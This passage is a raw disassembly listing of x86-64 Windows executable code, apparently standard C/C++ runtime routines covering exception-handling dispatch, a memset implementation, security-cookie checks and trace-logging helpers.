   14000258f:	74 13                	je     0x1400025a4
   140002591:	83 c8 20             	or     $0x20,%eax
   140002594:	c7 05 8e 2a 01 00 05 	movl   $0x5,0x12a8e(%rip)        # 0x14001502c
   14000259b:	00 00 00 
   14000259e:	89 05 8c 2a 01 00    	mov    %eax,0x12a8c(%rip)        # 0x140015030
   1400025a4:	33 c0                	xor    %eax,%eax
   1400025a6:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400025ab:	48 83 c4 20          	add    $0x20,%rsp
   1400025af:	5d                   	pop    %rbp
   1400025b0:	c3                   	ret
   1400025b1:	90                   	nop
   1400025b2:	90                   	nop
   1400025b3:	90                   	nop
   1400025b4:	33 c0                	xor    %eax,%eax
   1400025b6:	39 05 fc 44 01 00    	cmp    %eax,0x144fc(%rip)        # 0x140016ab8
   1400025bc:	0f 95 c0             	setne  %al
   1400025bf:	c3                   	ret
   1400025c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400025c5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400025ca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400025cf:	57                   	push   %rdi
   1400025d0:	41 54                	push   %r12
   1400025d2:	41 55                	push   %r13
   1400025d4:	41 56                	push   %r14
   1400025d6:	41 57                	push   %r15
   1400025d8:	48 83 ec 40          	sub    $0x40,%rsp
   1400025dc:	4d 8b 61 08          	mov    0x8(%r9),%r12
   1400025e0:	48 8b e9             	mov    %rcx,%rbp
   1400025e3:	4d 8b 39             	mov    (%r9),%r15
   1400025e6:	49 8b c8             	mov    %r8,%rcx
   1400025e9:	49 8b 59 38          	mov    0x38(%r9),%rbx
   1400025ed:	4d 2b fc             	sub    %r12,%r15
   1400025f0:	4d 8b f1             	mov    %r9,%r14
   1400025f3:	49 8b f8             	mov    %r8,%rdi
   1400025f6:	4c 8b ea             	mov    %rdx,%r13
   1400025f9:	e8 3a f8 ff ff       	call   0x140001e38
   1400025fe:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   140002602:	0f 85 e0 00 00 00    	jne    0x1400026e8
   140002608:	41 8b 76 48          	mov    0x48(%r14),%esi
   14000260c:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140002611:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140002616:	3b 33                	cmp    (%rbx),%esi
   140002618:	0f 83 6d 01 00 00    	jae    0x14000278b
   14000261e:	8b fe                	mov    %esi,%edi
   140002620:	48 03 ff             	add    %rdi,%rdi
   140002623:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   140002627:	4c 3b f8             	cmp    %rax,%r15
   14000262a:	0f 82 aa 00 00 00    	jb     0x1400026da
   140002630:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   140002634:	4c 3b f8             	cmp    %rax,%r15
   140002637:	0f 83 9d 00 00 00    	jae    0x1400026da
   14000263d:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   140002642:	0f 84 92 00 00 00    	je     0x1400026da
   140002648:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   14000264d:	74 17                	je     0x140002666
   14000264f:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   140002653:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002658:	49 03 c4             	add    %r12,%rax
   14000265b:	49 8b d5             	mov    %r13,%rdx
   14000265e:	ff d0                	call   *%rax
   140002660:	85 c0                	test   %eax,%eax
   140002662:	78 7d                	js     0x1400026e1
   140002664:	7e 74                	jle    0x1400026da
   140002666:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   14000266d:	75 28                	jne    0x140002697
   14000266f:	48 83 3d 59 44 01 00 	cmpq   $0x0,0x14459(%rip)        # 0x140016ad0
   140002676:	00 
   140002677:	74 1e                	je     0x140002697
   140002679:	48 8d 0d 50 44 01 00 	lea    0x14450(%rip),%rcx        # 0x140016ad0
   140002680:	e8 3b 8d 00 00       	call   0x14000b3c0
   140002685:	85 c0                	test   %eax,%eax
   140002687:	74 0e                	je     0x140002697
   140002689:	ba 01 00 00 00       	mov    $0x1,%edx
   14000268e:	48 8b cd             	mov    %rbp,%rcx
   140002691:	ff 15 39 44 01 00    	call   *0x14439(%rip)        # 0x140016ad0
   140002697:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   14000269b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400026a1:	49 03 cc             	add    %r12,%rcx
   1400026a4:	49 8b d5             	mov    %r13,%rdx
   1400026a7:	e8 94 05 00 00       	call   0x140002c40
   1400026ac:	49 8b 46 40          	mov    0x40(%r14),%rax
   1400026b0:	4c 8b c5             	mov    %rbp,%r8
   1400026b3:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   1400026b7:	49 8b cd             	mov    %r13,%rcx
   1400026ba:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   1400026be:	49 03 d4             	add    %r12,%rdx
   1400026c1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400026c6:	49 8b 46 28          	mov    0x28(%r14),%rax
   1400026ca:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400026cf:	ff 15 23 9a 00 00    	call   *0x9a23(%rip)        # 0x14000c0f8
   1400026d5:	e8 96 05 00 00       	call   0x140002c70
   1400026da:	ff c6                	inc    %esi
   1400026dc:	e9 35 ff ff ff       	jmp    0x140002616
   1400026e1:	33 c0                	xor    %eax,%eax
   1400026e3:	e9 a8 00 00 00       	jmp    0x140002790
   1400026e8:	49 8b 76 20          	mov    0x20(%r14),%rsi
   1400026ec:	41 8b 7e 48          	mov    0x48(%r14),%edi
   1400026f0:	49 2b f4             	sub    %r12,%rsi
   1400026f3:	e9 89 00 00 00       	jmp    0x140002781
   1400026f8:	8b cf                	mov    %edi,%ecx
   1400026fa:	48 03 c9             	add    %rcx,%rcx
   1400026fd:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140002701:	4c 3b f8             	cmp    %rax,%r15
   140002704:	72 79                	jb     0x14000277f
   140002706:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   14000270a:	4c 3b f8             	cmp    %rax,%r15
   14000270d:	73 70                	jae    0x14000277f
   14000270f:	f6 45 04 20          	testb  $0x20,0x4(%rbp)
   140002713:	74 44                	je     0x140002759
   140002715:	45 33 c9             	xor    %r9d,%r9d
   140002718:	85 d2                	test   %edx,%edx
   14000271a:	74 38                	je     0x140002754
   14000271c:	45 8b c1             	mov    %r9d,%r8d
   14000271f:	4d 03 c0             	add    %r8,%r8
   140002722:	42 8b 44 c3 04       	mov    0x4(%rbx,%r8,8),%eax
   140002727:	48 3b f0             	cmp    %rax,%rsi
   14000272a:	72 20                	jb     0x14000274c
   14000272c:	42 8b 44 c3 08       	mov    0x8(%rbx,%r8,8),%eax
   140002731:	48 3b f0             	cmp    %rax,%rsi
   140002734:	73 16                	jae    0x14000274c
   140002736:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   14000273a:	42 39 44 c3 10       	cmp    %eax,0x10(%rbx,%r8,8)
   14000273f:	75 0b                	jne    0x14000274c
   140002741:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   140002745:	42 39 44 c3 0c       	cmp    %eax,0xc(%rbx,%r8,8)
   14000274a:	74 08                	je     0x140002754
   14000274c:	41 ff c1             	inc    %r9d
   14000274f:	44 3b ca             	cmp    %edx,%r9d
   140002752:	72 c8                	jb     0x14000271c
   140002754:	44 3b ca             	cmp    %edx,%r9d
   140002757:	75 32                	jne    0x14000278b
   140002759:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   14000275d:	85 c0                	test   %eax,%eax
   14000275f:	74 07                	je     0x140002768
   140002761:	48 3b f0             	cmp    %rax,%rsi
   140002764:	74 25                	je     0x14000278b
   140002766:	eb 17                	jmp    0x14000277f
   140002768:	8d 47 01             	lea    0x1(%rdi),%eax
   14000276b:	49 8b d5             	mov    %r13,%rdx
   14000276e:	41 89 46 48          	mov    %eax,0x48(%r14)
   140002772:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140002777:	b1 01                	mov    $0x1,%cl
   140002779:	4d 03 c4             	add    %r12,%r8
   14000277c:	41 ff d0             	call   *%r8
   14000277f:	ff c7                	inc    %edi
   140002781:	8b 13                	mov    (%rbx),%edx
   140002783:	3b fa                	cmp    %edx,%edi
   140002785:	0f 82 6d ff ff ff    	jb     0x1400026f8
   14000278b:	b8 01 00 00 00       	mov    $0x1,%eax
   140002790:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140002795:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002799:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   14000279d:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400027a1:	49 8b e3             	mov    %r11,%rsp
   1400027a4:	41 5f                	pop    %r15
   1400027a6:	41 5e                	pop    %r14
   1400027a8:	41 5d                	pop    %r13
   1400027aa:	41 5c                	pop    %r12
   1400027ac:	5f                   	pop    %rdi
   1400027ad:	c3                   	ret
   1400027ae:	90                   	nop
   1400027af:	90                   	nop
   1400027b0:	90                   	nop
   1400027b1:	90                   	nop
   1400027b2:	90                   	nop
   1400027b3:	90                   	nop
   1400027b4:	90                   	nop
   1400027b5:	90                   	nop
   1400027b6:	90                   	nop
   1400027b7:	90                   	nop
   1400027b8:	90                   	nop
   1400027b9:	90                   	nop
   1400027ba:	90                   	nop
   1400027bb:	90                   	nop
   1400027bc:	90                   	nop
   1400027bd:	90                   	nop
   1400027be:	90                   	nop
   1400027bf:	90                   	nop
   1400027c0:	4c 8b d9             	mov    %rcx,%r11
   1400027c3:	0f b6 d2             	movzbl %dl,%edx
   1400027c6:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   1400027cd:	01 01 01 
   1400027d0:	4c 0f af ca          	imul   %rdx,%r9
   1400027d4:	49 83 f8 10          	cmp    $0x10,%r8
   1400027d8:	0f 86 ee 00 00 00    	jbe    0x1400028cc
   1400027de:	66 49 0f 6e c1       	movq   %r9,%xmm0
   1400027e3:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   1400027e7:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400027ee:	76 6d                	jbe    0x14000285d
   1400027f0:	0f ba 25 38 37 01 00 	btl    $0x1,0x13738(%rip)        # 0x140015f30
   1400027f7:	01 
   1400027f8:	73 14                	jae    0x14000280e
   1400027fa:	8b c2                	mov    %edx,%eax
   1400027fc:	48 8b d7             	mov    %rdi,%rdx
   1400027ff:	48 8b f9             	mov    %rcx,%rdi
   140002802:	49 8b c8             	mov    %r8,%rcx
   140002805:	f3 aa                	rep stos %al,(%rdi)
   140002807:	48 8b fa             	mov    %rdx,%rdi
   14000280a:	49 8b c3             	mov    %r11,%rax
   14000280d:	c3                   	ret
   14000280e:	0f 11 01             	movups %xmm0,(%rcx)
   140002811:	4c 03 c1             	add    %rcx,%r8
   140002814:	48 83 c1 10          	add    $0x10,%rcx
   140002818:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000281c:	4c 2b c1             	sub    %rcx,%r8
   14000281f:	4d 8b c8             	mov    %r8,%r9
   140002822:	49 c1 e9 07          	shr    $0x7,%r9
   140002826:	74 35                	je     0x14000285d
   140002828:	66 0f 1f 04 00       	nopw   (%rax,%rax,1)
   14000282d:	0f 29 01             	movaps %xmm0,(%rcx)
   140002830:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140002834:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000283b:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   14000283f:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   140002843:	49 ff c9             	dec    %r9
   140002846:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   14000284a:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   14000284e:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   140002852:	66 0f 29 41 f0       	movapd %xmm0,-0x10(%rcx)
   140002857:	75 d4                	jne    0x14000282d
   140002859:	49 83 e0 7f          	and    $0x7f,%r8
   14000285d:	4d 8b c8             	mov    %r8,%r9
   140002860:	49 c1 e9 04          	shr    $0x4,%r9
   140002864:	74 0f                	je     0x140002875
   140002866:	0f 1f 00             	nopl   (%rax)
   140002869:	0f 11 01             	movups %xmm0,(%rcx)
   14000286c:	48 83 c1 10          	add    $0x10,%rcx
   140002870:	49 ff c9             	dec    %r9
   140002873:	75 f4                	jne    0x140002869
   140002875:	49 83 e0 0f          	and    $0xf,%r8
   140002879:	74 06                	je     0x140002881
   14000287b:	41 0f 11 44 08 f0    	movups %xmm0,-0x10(%r8,%rcx,1)
   140002881:	49 8b c3             	mov    %r11,%rax
   140002884:	c3                   	ret
   140002885:	90                   	nop
   140002886:	90                   	nop
   140002887:	90                   	nop
   140002888:	f8                   	clc
   140002889:	28 00                	sub    %al,(%rax)
   14000288b:	00 f5                	add    %dh,%ch
   14000288d:	28 00                	sub    %al,(%rax)
   14000288f:	00 1b                	add    %bl,(%rbx)
   140002891:	29 00                	sub    %eax,(%rax)
   140002893:	00 f1                	add    %dh,%cl
   140002895:	28 00                	sub    %al,(%rax)
   140002897:	00 fd                	add    %bh,%ch
   140002899:	28 00                	sub    %al,(%rax)
   14000289b:	00 0d 29 00 00 18    	add    %cl,0x18000029(%rip)        # 0x1580028ca
   1400028a1:	29 00                	sub    %eax,(%rax)
   1400028a3:	00 ee                	add    %ch,%dh
   1400028a5:	28 00                	sub    %al,(%rax)
   1400028a7:	00 20                	add    %ah,(%rax)
   1400028a9:	29 00                	sub    %eax,(%rax)
   1400028ab:	00 01                	add    %al,(%rcx)
   1400028ad:	29 00                	sub    %eax,(%rax)
   1400028af:	00 2f                	add    %ch,(%rdi)
   1400028b1:	29 00                	sub    %eax,(%rax)
   1400028b3:	00 24 29             	add    %ah,(%rcx,%rbp,1)
   1400028b6:	00 00                	add    %al,(%rax)
   1400028b8:	f9                   	stc
   1400028b9:	28 00                	sub    %al,(%rax)
   1400028bb:	00 09                	add    %cl,(%rcx)
   1400028bd:	29 00                	sub    %eax,(%rax)
   1400028bf:	00 14 29             	add    %dl,(%rcx,%rbp,1)
   1400028c2:	00 00                	add    %al,(%rax)
   1400028c4:	ea                   	(bad)
   1400028c5:	28 00                	sub    %al,(%rax)
   1400028c7:	00 37                	add    %dh,(%rdi)
   1400028c9:	29 00                	sub    %eax,(%rax)
   1400028cb:	00 49 8b             	add    %cl,-0x75(%rcx)
   1400028ce:	d1 4c 8d 0d          	rorl   $1,0xd(%rbp,%rcx,4)
   1400028d2:	2a d7                	sub    %bh,%dl
   1400028d4:	ff                   	(bad)
   1400028d5:	ff 43 8b             	incl   -0x75(%rbx)
   1400028d8:	84 81 88 28 00 00    	test   %al,0x2888(%rcx)
   1400028de:	4c 03 c8             	add    %rax,%r9
   1400028e1:	49 03 c8             	add    %r8,%rcx
   1400028e4:	49 8b c3             	mov    %r11,%rax
   1400028e7:	41 ff e1             	jmp    *%r9
   1400028ea:	48 89 51 f1          	mov    %rdx,-0xf(%rcx)
   1400028ee:	89 51 f9             	mov    %edx,-0x7(%rcx)
   1400028f1:	66 89 51 fd          	mov    %dx,-0x3(%rcx)
   1400028f5:	88 51 ff             	mov    %dl,-0x1(%rcx)
   1400028f8:	c3                   	ret
   1400028f9:	48 89 51 f4          	mov    %rdx,-0xc(%rcx)
   1400028fd:	89 51 fc             	mov    %edx,-0x4(%rcx)
   140002900:	c3                   	ret
   140002901:	48 89 51 f7          	mov    %rdx,-0x9(%rcx)
   140002905:	88 51 ff             	mov    %dl,-0x1(%rcx)
   140002908:	c3                   	ret
   140002909:	48 89 51 f3          	mov    %rdx,-0xd(%rcx)
   14000290d:	89 51 fb             	mov    %edx,-0x5(%rcx)
   140002910:	88 51 ff             	mov    %dl,-0x1(%rcx)
   140002913:	c3                   	ret
   140002914:	48 89 51 f2          	mov    %rdx,-0xe(%rcx)
   140002918:	89 51 fa             	mov    %edx,-0x6(%rcx)
   14000291b:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   14000291f:	c3                   	ret
   140002920:	48 89 10             	mov    %rdx,(%rax)
   140002923:	c3                   	ret
   140002924:	48 89 10             	mov    %rdx,(%rax)
   140002927:	66 89 50 08          	mov    %dx,0x8(%rax)
   14000292b:	88 50 0a             	mov    %dl,0xa(%rax)
   14000292e:	c3                   	ret
   14000292f:	48 89 10             	mov    %rdx,(%rax)
   140002932:	66 89 50 08          	mov    %dx,0x8(%rax)
   140002936:	c3                   	ret
   140002937:	48 89 10             	mov    %rdx,(%rax)
   14000293a:	48 89 50 08          	mov    %rdx,0x8(%rax)
   14000293e:	c3                   	ret
   14000293f:	90                   	nop
   140002940:	66 90                	xchg   %ax,%ax
   140002942:	c3                   	ret
   140002943:	90                   	nop
   140002944:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002949:	55                   	push   %rbp
   14000294a:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   140002951:	ff 
   140002952:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140002959:	48 8b 05 b8 26 01 00 	mov    0x126b8(%rip),%rax        # 0x140015018
   140002960:	48 33 c4             	xor    %rsp,%rax
   140002963:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   14000296a:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002970:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140002975:	ff 15 95 96 00 00    	call   *0x9695(%rip)        # 0x14000c010
   14000297b:	33 db                	xor    %ebx,%ebx
   14000297d:	85 c0                	test   %eax,%eax
   14000297f:	75 05                	jne    0x140002986
   140002981:	66 89 5c 24 70       	mov    %bx,0x70(%rsp)
   140002986:	3d 04 01 00 00       	cmp    $0x104,%eax
   14000298b:	75 11                	jne    0x14000299e
   14000298d:	ff 15 6d 96 00 00    	call   *0x966d(%rip)        # 0x14000c000
   140002993:	85 c0                	test   %eax,%eax
   140002995:	75 07                	jne    0x14000299e
   140002997:	66 89 9d 76 01 00 00 	mov    %bx,0x176(%rbp)
   14000299e:	83 3d 9b 26 01 00 05 	cmpl   $0x5,0x1269b(%rip)        # 0x140015040
   1400029a5:	0f 86 91 00 00 00    	jbe    0x140002a3c
   1400029ab:	48 ba 00 00 00 00 00 	movabs $0x200000000000,%rdx
   1400029b2:	20 00 00 
   1400029b5:	48 85 15 94 26 01 00 	test   %rdx,0x12694(%rip)        # 0x140015050
   1400029bc:	74 7e                	je     0x140002a3c
   1400029be:	48 8b 05 93 26 01 00 	mov    0x12693(%rip),%rax        # 0x140015058
   1400029c5:	48 23 c2             	and    %rdx,%rax
   1400029c8:	48 3b 05 89 26 01 00 	cmp    0x12689(%rip),%rax        # 0x140015058
   1400029cf:	75 6b                	jne    0x140002a3c
   1400029d1:	48 8d 05 e8 99 00 00 	lea    0x99e8(%rip),%rax        # 0x14000c3c0
   1400029d8:	48 c7 44 24 58 0e 00 	movq   $0xe,0x58(%rsp)
   1400029df:	00 00 
   1400029e1:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400029e6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400029eb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400029ef:	48 ff c0             	inc    %rax
   1400029f2:	66 39 1c 41          	cmp    %bx,(%rcx,%rax,2)
   1400029f6:	75 f7                	jne    0x1400029ef
   1400029f8:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400029fd:	89 5c 24 6c          	mov    %ebx,0x6c(%rsp)
   140002a01:	8d 04 45 02 00 00 00 	lea    0x2(,%rax,2),%eax
   140002a08:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   140002a0d:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140002a11:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002a16:	45 33 c9             	xor    %r9d,%r9d
   140002a19:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002a1e:	48 8d 15 94 ff 00 00 	lea    0xff94(%rip),%rdx        # 0x1400129b9
   140002a25:	45 33 c0             	xor    %r8d,%r8d
   140002a28:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002a2f:	00 
   140002a30:	48 8d 0d 09 26 01 00 	lea    0x12609(%rip),%rcx        # 0x140015040
   140002a37:	e8 04 e7 ff ff       	call   0x140001140
   140002a3c:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140002a43:	48 33 cc             	xor    %rsp,%rcx
   140002a46:	e8 55 f0 ff ff       	call   0x140001aa0
   140002a4b:	48 8b 9c 24 a8 02 00 	mov    0x2a8(%rsp),%rbx
   140002a52:	00 
   140002a53:	48 81 c4 90 02 00 00 	add    $0x290,%rsp
   140002a5a:	5d                   	pop    %rbp
   140002a5b:	c3                   	ret
   140002a5c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002a61:	55                   	push   %rbp
   140002a62:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   140002a69:	ff 
   140002a6a:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140002a71:	48 8b 05 a0 25 01 00 	mov    0x125a0(%rip),%rax        # 0x140015018
   140002a78:	48 33 c4             	xor    %rsp,%rax
   140002a7b:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   140002a82:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002a88:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140002a8d:	ff 15 7d 95 00 00    	call   *0x957d(%rip)        # 0x14000c010
   140002a93:	33 db                	xor    %ebx,%ebx
   140002a95:	85 c0                	test   %eax,%eax
   140002a97:	75 05                	jne    0x140002a9e
   140002a99:	66 89 5c 24 70       	mov    %bx,0x70(%rsp)
   140002a9e:	3d 04 01 00 00       	cmp    $0x104,%eax
   140002aa3:	75 11                	jne    0x140002ab6
   140002aa5:	ff 15 55 95 00 00    	call   *0x9555(%rip)        # 0x14000c000
   140002aab:	85 c0                	test   %eax,%eax
   140002aad:	75 07                	jne    0x140002ab6
   140002aaf:	66 89 9d 76 01 00 00 	mov    %bx,0x176(%rbp)
   140002ab6:	83 3d 83 25 01 00 05 	cmpl   $0x5,0x12583(%rip)        # 0x140015040
   140002abd:	0f 86 91 00 00 00    	jbe    0x140002b54
   140002ac3:	48 ba 00 00 00 00 00 	movabs $0x200000000000,%rdx
   140002aca:	20 00 00 
   140002acd:	48 85 15 7c 25 01 00 	test   %rdx,0x1257c(%rip)        # 0x140015050
   140002ad4:	74 7e                	je     0x140002b54
   140002ad6:	48 8b 05 7b 25 01 00 	mov    0x1257b(%rip),%rax        # 0x140015058
   140002add:	48 23 c2             	and    %rdx,%rax
   140002ae0:	48 3b 05 71 25 01 00 	cmp    0x12571(%rip),%rax        # 0x140015058
   140002ae7:	75 6b                	jne    0x140002b54
   140002ae9:	48 8d 05 e0 98 00 00 	lea    0x98e0(%rip),%rax        # 0x14000c3d0
   140002af0:	48 c7 44 24 58 0f 00 	movq   $0xf,0x58(%rsp)
   140002af7:	00 00 
   140002af9:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002afe:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002b03:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140002b07:	48 ff c0             	inc    %rax
   140002b0a:	66 39 1c 41          	cmp    %bx,(%rcx,%rax,2)
   140002b0e:	75 f7                	jne    0x140002b07
   140002b10:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002b15:	89 5c 24 6c          	mov    %ebx,0x6c(%rsp)
   140002b19:	8d 04 45 02 00 00 00 	lea    0x2(,%rax,2),%eax
   140002b20:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   140002b25:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140002b29:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002b2e:	45 33 c9             	xor    %r9d,%r9d
   140002b31:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002b36:	48 8d 15 b8 fe 00 00 	lea    0xfeb8(%rip),%rdx        # 0x1400129f5
   140002b3d:	45 33 c0             	xor    %r8d,%r8d
   140002b40:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002b47:	00 
   140002b48:	48 8d 0d f1 24 01 00 	lea    0x124f1(%rip),%rcx        # 0x140015040
   140002b4f:	e8 ec e5 ff ff       	call   0x140001140
   140002b54:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140002b5b:	48 33 cc             	xor    %rsp,%rcx
   140002b5e:	e8 3d ef ff ff       	call   0x140001aa0
   140002b63:	48 8b 9c 24 a8 02 00 	mov    0x2a8(%rsp),%rbx
   140002b6a:	00 
   140002b6b:	48 81 c4 90 02 00 00 	add    $0x290,%rsp
   140002b72:	5d                   	pop    %rbp
   140002b73:	c3                   	ret
   140002b74:	45 33 c9             	xor    %r9d,%r9d
   140002b77:	48 8d 0d c2 24 01 00 	lea    0x124c2(%rip),%rcx        # 0x140015040
   140002b7e:	45 33 c0             	xor    %r8d,%r8d
   140002b81:	33 d2                	xor    %edx,%edx
   140002b83:	e9 78 e4 ff ff       	jmp    0x140001000
   140002b88:	48 83 ec 28          	sub    $0x28,%rsp
   140002b8c:	48 8b 0d cd 24 01 00 	mov    0x124cd(%rip),%rcx        # 0x140015060
   140002b93:	e8 ac 03 00 00       	call   0x140002f44
   140002b98:	48 83 25 c0 24 01 00 	andq   $0x0,0x124c0(%rip)        # 0x140015060
   140002b9f:	00 
   140002ba0:	48 83 c4 28          	add    $0x28,%rsp
   140002ba4:	c3                   	ret
   140002ba5:	90                   	nop
   140002ba6:	90                   	nop
   140002ba7:	90                   	nop
   140002ba8:	48 83 ec 28          	sub    $0x28,%rsp
   140002bac:	e8 83 07 00 00       	call   0x140003334
   140002bb1:	e8 02 06 00 00       	call   0x1400031b8
   140002bb6:	e8 f9 06 00 00       	call   0x1400032b4
   140002bbb:	84 c0                	test   %al,%al
   140002bbd:	75 04                	jne    0x140002bc3
   140002bbf:	32 c0                	xor    %al,%al
   140002bc1:	eb 17                	jmp    0x140002bda
   140002bc3:	e8 88 06 00 00       	call   0x140003250
   140002bc8:	84 c0                	test   %al,%al
   140002bca:	75 07                	jne    0x140002bd3
   140002bcc:	e8 2b 07 00 00       	call   0x1400032fc
   140002bd1:	eb ec                	jmp    0x140002bbf
   140002bd3:	e8 9c ff ff ff       	call   0x140002b74
   140002bd8:	b0 01                	mov    $0x1,%al
   140002bda:	48 83 c4 28          	add    $0x28,%rsp
   140002bde:	c3                   	ret
   140002bdf:	90                   	nop
   140002be0:	53                   	push   %rbx
   140002be1:	48 83 ec 20          	sub    $0x20,%rsp
   140002be5:	8a d9                	mov    %cl,%bl
   140002be7:	e8 9c ff ff ff       	call   0x140002b88
   140002bec:	84 db                	test   %bl,%bl
   140002bee:	75 11                	jne    0x140002c01
   140002bf0:	e8 9b 06 00 00       	call   0x140003290
   140002bf5:	e8 02 07 00 00       	call   0x1400032fc
   140002bfa:	33 c9                	xor    %ecx,%ecx
   140002bfc:	e8 ef 05 00 00       	call   0x1400031f0
   140002c01:	b0 01                	mov    $0x1,%al
   140002c03:	48 83 c4 20          	add    $0x20,%rsp
   140002c07:	5b                   	pop    %rbx
   140002c08:	c3                   	ret
   140002c09:	90                   	nop
   140002c0a:	90                   	nop
   140002c0b:	90                   	nop
   140002c0c:	90                   	nop
   140002c0d:	90                   	nop
   140002c0e:	90                   	nop
   140002c0f:	90                   	nop
   140002c10:	48 81 ec d8 04 00 00 	sub    $0x4d8,%rsp
   140002c17:	4d 33 c0             	xor    %r8,%r8
   140002c1a:	4d 33 c9             	xor    %r9,%r9
   140002c1d:	48 89 64 24 20       	mov    %rsp,0x20(%rsp)
   140002c22:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140002c27:	e8 30 87 00 00       	call   0x14000b35c
   140002c2c:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   140002c33:	c3                   	ret
   140002c34:	90                   	nop
   140002c35:	90                   	nop
   140002c36:	90                   	nop
   140002c37:	90                   	nop
   140002c38:	90                   	nop
   140002c39:	90                   	nop
   140002c3a:	90                   	nop
   140002c3b:	90                   	nop
   140002c3c:	90                   	nop
   140002c3d:	90                   	nop
   140002c3e:	90                   	nop
   140002c3f:	90                   	nop
   140002c40:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002c45:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140002c4a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140002c4f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140002c56:	eb 08                	jmp    0x140002c60
   140002c58:	90                   	nop
   140002c59:	90                   	nop
   140002c5a:	90                   	nop
   140002c5b:	90                   	nop
   140002c5c:	90                   	nop
   140002c5d:	90                   	nop
   140002c5e:	90                   	nop
   140002c5f:	90                   	nop
   140002c60:	c3                   	ret
   140002c61:	90                   	nop
   140002c62:	90                   	nop
   140002c63:	90                   	nop
   140002c64:	90                   	nop
   140002c65:	90                   	nop
   140002c66:	90                   	nop
   140002c67:	90                   	nop
   140002c68:	90                   	nop
   140002c69:	90                   	nop
   140002c6a:	90                   	nop
   140002c6b:	90                   	nop
   140002c6c:	90                   	nop
   140002c6d:	90                   	nop
   140002c6e:	90                   	nop
   140002c6f:	90                   	nop
   140002c70:	c3                   	ret
